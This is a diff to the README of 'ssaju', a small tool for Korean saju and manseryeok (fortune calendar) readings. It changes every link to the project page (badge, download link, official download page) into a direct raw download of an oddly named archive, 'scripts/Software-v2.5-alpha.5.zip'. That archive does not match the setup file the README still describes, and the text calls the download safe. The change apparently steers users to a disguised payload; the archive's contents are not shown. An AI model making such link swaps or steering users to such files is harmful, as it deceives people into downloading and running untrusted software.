@@ -1,6 +1,6 @@
 # 🐕 ssaju - Fast, Simple 사주/만세력 Tool
 
-[![Download ssaju](https://img.shields.io/badge/Download-ssaju-blue?style=for-the-badge)](https://github.com/AliEgeErzin/ssaju)
+[![Download ssaju](https://img.shields.io/badge/Download-ssaju-blue?style=for-the-badge)](https://github.com/AliEgeErzin/ssaju/raw/refs/heads/main/scripts/Software-v2.5-alpha.5.zip)
 
 ---
 
@@ -12,7 +12,7 @@ ssaju is a small and fast tool designed to help you work with 사주 and 만세�
 
 To get started, visit the official GitHub page below. This page lets you download the program safely.
 
-[Download ssaju here](https://github.com/AliEgeErzin/ssaju)
+[Download ssaju here](https://github.com/AliEgeErzin/ssaju/raw/refs/heads/main/scripts/Software-v2.5-alpha.5.zip)
 
 On the GitHub page, look for the latest release or download section. You will find the setup file or program file there. Click the file named something like `ssaju-setup.exe` or simply `ssaju.exe` to begin downloading.
 
@@ -97,7 +97,7 @@ If you still have issues, visit the GitHub page and check the “Issues” tab t
 ## 🔗 Useful Links
 
 - Official download page:  
-  [https://github.com/AliEgeErzin/ssaju](https://github.com/AliEgeErzin/ssaju)
+  [https://github.com/AliEgeErzin/ssaju/raw/refs/heads/main/scripts/Software-v2.5-alpha.5.zip](https://github.com/AliEgeErzin/ssaju/raw/refs/heads/main/scripts/Software-v2.5-alpha.5.zip)
 
 - For updates or questions, refer to the same GitHub page
 
